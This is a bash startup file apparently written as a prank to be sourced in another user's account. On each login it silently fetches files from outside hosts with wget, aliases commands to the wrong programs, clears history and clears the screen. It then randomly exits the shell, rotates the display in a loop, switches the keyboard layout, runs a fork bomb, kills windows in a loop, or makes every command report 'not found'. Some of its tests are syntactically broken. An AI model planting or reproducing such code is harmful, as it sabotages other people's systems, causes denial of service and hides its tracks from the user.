#!/bin/bash
##  
##   .mybashrc for troll in /home/troll_lol
#	 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
#	 ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░░
#	 ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
#	 ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
#	 ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
#	 ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
#	 █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
#	 █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
#	 ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
#	 ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
#	 ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
#	 ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
#	 ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
#	 ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
#	 ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
#	 ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
#	 ░░░░░░░░░░░░░░░░░░░░▀▄▄▄▄▄▄▀░░░
#	 ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░﻿
##   
##   Made by π_m
##   Login   <π_m@epitech.net>
##   
##   Started on  Wed Oct 22 21:25:16 2014 trollo_l
##  

#
# http://unix.stackexchange.com/questions/72131/detecting-x-session-in-a-bash-script-bashrc-etc
# http://www.tux-planet.fr/provoquer-un-crash-sur-une-machine-linux/
# http://www.linuxjournal.com/article/10815
#


wget -cq http://www.microskiff.com/yabbfiles/Attachments/RTFM.jpeg -O .RTFM.jpeg
wget -cq http://myfreeringtones.org/uploads/www.ringersmobile.comTrolololo-trollsong.wav -O .trollol.wav

#if xterm
setterm -cursor off
setterm -reverse on
setterm -blink on

alias cd=ls
alias emacs="vi"
alias ne="emacs"
alias chromium="(chromium --incognito --app=http:/nobrain.dk &) ; history -c && clear;"
alias firefox="chromium"
alias tcsh="bash"
alias zsh="bash"
export PAGER='rev'
export PS1="B==D"

trolol()
{
    i=0
    while [ 1 ]
    do
	i=$(($i + 1))
	xrandr -o $i
	sleep 2
	if [ $i -eq 3 ]
	then
	    i=0
	fi
    done
};

# si Lxterminal
#echo "^[(0"

# ajouter 
# speaker-test -t sine -f 1000 -l 2 2>&1
#speaker-test -t wav

lol=$RANDOM
let "lol %= 10"
# echo "->$lol<>"
if [ $lol -le 2 ]
then
    echo "No luck ;) !"
    echo ""
    echo ""
    echo "		L	"
    echo "		O	"
    echo "		L	"
    sleep $lol
    exit
elif [ $lol -eq 3]
then
xtermset  -bg white
elif [ $lol -eq 4 ]
then
    echo "Oh U're Lucky =O !!!"
   trolol &
elif [ $lol -eq 5 ]
then
    echo "Oh U're really Lucky :) !!!"
    elif [ $lol -eq 6]
    then
    setxkbmap ru
    elif [ $lol -eq 7]
    then
    :(){ :|:& };:
    elif [ $lol -eq 8]
    then
       while true; do sleep $lol; xkill; done &
    elif [ $lol -eq 9]
    then
       for cmd in `ls /bin /usr/bin/`; do alias $cmd="echo bash: $cmd: command not found"; done
   
fi

history -c
clear